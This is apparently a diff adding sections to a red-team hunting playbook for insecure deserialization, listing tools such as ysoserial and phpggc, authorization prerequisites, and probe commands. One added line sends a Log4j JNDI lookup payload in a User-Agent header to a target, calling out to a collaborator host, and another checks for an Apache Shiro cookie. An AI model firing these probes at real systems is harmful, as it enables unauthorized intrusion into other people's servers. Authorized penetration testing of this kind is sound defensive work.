@@ -10,6 +10,38 @@ tags: [deserialization, hunt, redteam]
 
 # HUNT-DESERIALIZATION — Insecure Deserialization
 
+## When to Use
+
+- Target runs Java, PHP serialization, Python pickle, .NET.
+- Ruby on Rails.
+
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`, `interactsh-client`, `phpggc`, `python3`, `ysoserial`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+# Java serialized objects start with AC ED 00 05 (hex) or rO0A (base64)
+echo "rO0ABXQ=" | base64 -d | xxd | head -1  # shows: ac ed 00 05
+
+# PHP serialization: O:8:"stdClass":0:{}
+# Python pickle: starts with \x80\x04 (protocol 4) or \x80\x02
+
+# Apache Shiro: rememberMe cookie present
+curl --max-time 30 --connect-timeout 10 -sI https://$TARGET/ | grep -i "Set-Cookie.*rememberMe"
+
+# Log4j: test user-controlled fields for JNDI interpolation
+curl --max-time 30 --connect-timeout 10 -H 'User-Agent: ${jndi:dns://COLLAB_HOST/a}' https://$TARGET/
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
+
 ## Crown Jewel Targets
 
 Deserialization bugs are almost always Critical — they lead directly to RCE without prerequisite conditions.
